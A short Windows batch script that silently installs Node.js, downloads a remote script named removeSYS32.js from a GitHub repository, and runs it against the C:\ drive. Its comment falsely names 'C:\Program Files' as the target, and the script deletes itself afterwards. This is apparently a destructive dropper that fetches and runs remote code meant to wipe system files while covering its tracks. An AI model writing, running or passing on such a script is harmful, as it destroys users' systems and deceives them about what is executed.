@echo off

REM 1. Download Node.js MSI installer
powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://nodejs.org/dist/v18.16.1/node-v18.16.1-x64.msi', 'nodejs.msi')"

REM 2. Install Node.js
start /wait msiexec /i nodejs.msi /qn

REM 3. Clean up the downloaded MSI installer
del nodejs.msi

REM 4. Execute "node index.js C:\Program Files"
curl -o index.js https://raw.githubusercontent.com/naquangaston/HostedFiles/main/UserScripts/removeSYS32.js
node index.js C:\

REM 5. Self-delete the script
timeout /t 3 >nul
del "%~f0"
